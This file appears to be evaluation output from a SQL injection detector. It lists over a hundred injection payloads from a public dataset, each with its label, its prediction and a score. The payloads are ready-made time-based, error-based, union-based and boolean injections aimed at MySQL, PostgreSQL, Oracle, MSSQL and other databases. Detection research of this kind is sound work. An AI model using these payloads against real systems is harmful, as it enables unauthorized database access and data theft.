text,source,true_label,pred_label,score_sqli,correct
"1' )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and  ( 'ffzv' = 'ffzv",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5272552938263149,1
"1%"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2857713266112387,1
-7758%'  )  )   )  or 3038 = 3038,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1670488236776373,1
"1  )  )   as cusv where 4871 = 4871 and elt ( 1210 = 1210,sleep ( 5  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.8826860149308615,1
"-5616""  )  )   )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( ""hdrb"" like ""hdrb",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5210028728672673,1
"1""  )  )   as ufba where 4049 = 4049",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,6.850951897327288,1
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9816028436011137,1
1 where 4641 = 4641,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,11.11448090367956,1
"1""  )  )   as mlid where 1047 = 1047 union all select null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.6746331388413545,1
1'  )  )   and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (  'prjf' = 'prjf,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5528343009777175,1
1 )  as msat where 1267 = 1267,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,6.850951897327288,1
1' where 7036 = 7036,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,11.11448090367956,1
if ( 5896 = 4251 )  select 5896 else drop function xmyk--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8621887083096735,1
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and   (  (   ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.576311503917634,1
1 where 1299 = 1299,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,11.11448090367956,1
"1""  )  )   and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  ""gxqq"" = ""gxqq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.547694023819082,1
"1 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1936334377736026,1
"select * from generate_series ( 4592,4592,case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.77551028999002,1
"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and ""dsae"" = ""dsae",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.4061180913260003,1
-2291  )  )   or 4067 = 5666#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.2277666442573032,1
"1%'  )  )   procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (  '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3671366895074948,1
"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and ""gknn"" like ""gknn",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8438995687290503,1
"1'  )  )   and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'rggg' = 'rggg",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3955894142294978,1
1'+ ( select ophz where 9158 = 9158 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo  )  )  +',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.7074125563763323,1
"1 )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9766276009962884,1
"-7858' )  union all select 1541,1541,1541,1541,1541,1541#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.6656276430530992,1
"-2397  )  )   as oizy where 1746 = 1746 union all select 1746,1746,1746,1746,1746,1746#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,10.763869452349464,1
"1'  )  )   procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (  'asdc' like 'asdc",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.5499862424643,1
"-8410"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""xhzr"" = ""xhzr",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4252310254441884,1
"1' )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1216307336817246,1
"1"" where 1051 = 1051 union all select null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,9.200123082930677,1
"1""  )  )   )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (   ( ""fpkm"" like ""fpkm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4162080734283398,1
-5751 )  as jybu where 4739 = 4739 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.710753096612189,1
"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""aixs"" = ""aixs",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.600656701847891,1
"1  )  )   or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1671966787741905,1
"1%'  )  )   and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.176966851328767,1
1' )  where 3572 = 3572,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,11.11448090367956,1
"1%' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.600656701847891,1
"1"" )  as rgod where 5766 = 5766 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8759738796962162,1
"-6292 )  union all select 7499,7499,7499,7499,7499,7499,7499--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.12148135625263823,1
"1' and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and 'rtbm' = 'rtbm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4074939717894004,1
"-9845"" )  as xpis where 1936 = 1936 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.7417062321164227,1
"1%' )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.547694023819082,1
"-5644""  )  )   )  or make_set ( 9354 = 9354,7185 )  and   (  (   ( ""evcf"" = ""evcf",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5909260331555866,1
"select pg_sleep ( 5 )  and  ( ""pjql"" like ""pjql",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.683585237337117,1
"1"" )  where 1793 = 1793",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,11.11448090367956,1
"1"" or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1892283965374253,1
"1%'  )  )   or elt ( 5873 = 5873,sleep ( 5  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2542504817265667,1
"1"" )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( ""ilrk"" = ""ilrk",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4850962760207744,1
"1%""  )  )   and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9975219252157406,1
"-5032' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2442722488490963,1
"-5132%""  )  )   or 3038 = 3038",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.8951058420958744,1
1' )  rlike sleep ( 5 )  and  ( 'tslp' = 'tslp,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.4492651872774553,1
"1  )  )   as tuxy where 6855 = 6855 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8008460651563964,1
"1""  )  )   or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  ""ampn"" like ""ampn",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7040150609630234,1
"iif ( 3760 = 4785,1,1/0 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9150662686819353,1
"1""  )  )   or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9859626044981105,1
"-3729'  )  )   or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'czed' = 'czed",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3837120939488192,1
-5152'  )  )   or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  'jumr' like 'jumr,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.6186652563394113,1
"1  )  )   )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( 9184 = 9184",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3406718969972926,1
"1' in boolean mode )  union all select null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.325963088317383,1
select  ( case when  ( 7019 = 1998 )  then 7019 else 7019* ( select 7019 from mysql.db )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.013893303125471,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and  ( ""vabm"" = ""vabm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2442597833162565,1
"-8429'  )  )   )  or make_set ( 9354 = 9354,7185 )  and   (  (   ( 'bwih' like 'bwih",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8060616019757558,1
"1%"" and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2892902168100637,1
"1' )  where 1323 = 1323 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.3059294826412797,1
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and 'cwuy' = 'cwuy",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4565769021466715,1
"1 and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) -- gynj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1568805559217934,1
-2351  )  )   as xdqn where 4019 = 4019 or 8571 = 8571--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7358243410684906,1
"1' where 5004 = 5004 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9444340705620065,1
"1""  )  )   )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (   ( ""ipqw"" like ""ipqw",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7702782333532665,1
select  ( case when  ( 2394 = 4530 )  then 2394 else 2394* ( select 2394 from information_schema.character_sets )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0767743828196419,1
"1%""  )  )   and 2006 = 2006",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9733828875963155,1
"-8924  )  )   as jybr where 7901 = 7901 or elt ( 1032 = 1032,3623 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.4661721053817836,1
"1' in boolean mode )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7720761937512488,1
1 and 5934 = 7745,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.8748927871985779,1
"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and 'kird' = 'kird",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2857713266112387,1
"-1263"" )  or 9323 = 9323#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2121732964367167,1
select  ( case when  ( 9318 = 7198 )  then 9318 else 9318* ( select 9318 from information_schema.character_sets )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.532124000604475,1
"1'  )  )   )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 'jicq' like 'jicq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8658692100439758,1
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and  ( 1473 = 1473",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2572145509813384,1
1'+ ( select wpai where 3685 = 3685,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,8.909604555156633,1
"1"" )  where 2656 = 2656 or sleep ( 5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,5.583665664588555,1
1' )  as twny where 9580 = 9580,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,6.850951897327288,1
"select count ( * )  from generate_series ( 1,5000000 )  and 'dfwj' = 'dfwj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7397656335485363,1
select sleep ( 5 )  and 'gajm' = 'gajm,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.259855176029646,1
"1""  )  )   or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  ""wdye"" like ""wdye",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2318263870015322,1
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (   ( 'wvzw' = 'wvzw",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7397656335485363,1
"1%"" )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1495217562793913,1
1'+ ( select 'sbji' where 7989 = 7989 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo  )  )  +',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8666735876916671,1
"1""  )  )   as ajwe where 1153 = 1153 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.647349798175047,1
"-7122"" )  union all select 4002,4002,4002,4002,4002,4002,4002,4002#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,5.2696061534205505,1
1'  )  )   as egsj where 3447 = 3447,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,6.850951897327288,1
"1"" and 5205 = 9975#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.8567821398544524,1
"1' or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and 'aezm' like 'aezm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.6798613132977656,1
"1' )  as rqfq where 7077 = 7077 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8800828832786547,1
1'|| ( select 'kuxp' where 7123 = 7123 and 1688 = 4200#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,9.67908125297695,1
"1%""  )  )   waitfor delay '0:0:5' and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.1552390914112918,1
"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'adsh' = 'adsh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3344683366493302,1
"1'  )  )   as prxm where 1267 = 1267 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.0172491593519712,1
"1"" )  as jiiq where 6847 = 6847",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9188038373928453,1
1'  )  )   as qqvk where 1007 = 1007,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.5371867684475011,1
"1%""  )  )   or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9952468751770509,1
"1""  )  )   )  union all select null,null,null,null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3433878438416331,1
1' )  where 5378 = 5378,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.4613894077084424,1
"1""  )  )   )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9859626044981105,1
"1%"" )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5600931973771768,1
"select * from generate_series ( 5206,5206,case when  ( 5206 = 2214 )  then 1 else 0 end )  limit 1--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.77551028999002,1
"1%"" )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5528343009777175,1
"-6007""  )  )   union all select 6019,6019,6019,6019,6019,6019,6019,6019--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.1407955343601024,1
-8234'  )  )   )  or 9323 = 9323#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2121732964367167,1
"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) -- dtha",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.1266686962057113,1
1  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (  1476 = 1476,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0298753331730104,1
"1%"" )  union all select null,null,null,null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0419921264206555,1
1'  )  )   as iipj where 6560 = 6560,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,6.850951897327288,1
"1' )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  ( 'zypa' = 'zypa",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.656058864759802,1
"( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7055614698742214,1
"1'  )  )   as icik where 1440 = 1440 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.82153183889589,1
1 where 6036 = 6036 and 7533 = 7533--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.651397538357604,1
"-6611%""  )  )   )  union all select 8918,8918#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.1150571570295487,1
"-9156'  )  )   union all select 9110,9110,9110,9110#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.346575897219112,1
"-8640 )  or elt ( 7657 = 5020,5020 )  and  ( 2346 = 2346",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.6662054862294264,1
"-2122"" )  as zytb where 7025 = 7025 or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8043092599337969,1
"-9860 )  where 8743 = 8743 union all select 8743,8743,8743,8743,8743,8743,8743--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,7.095784711235691,1
-3861' )  as zmja where 4036 = 4036 or 9323 = 9323#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.1312007462742786,1
"1%"" or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5389574070576357,1
"1"" and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2933316279383165,1
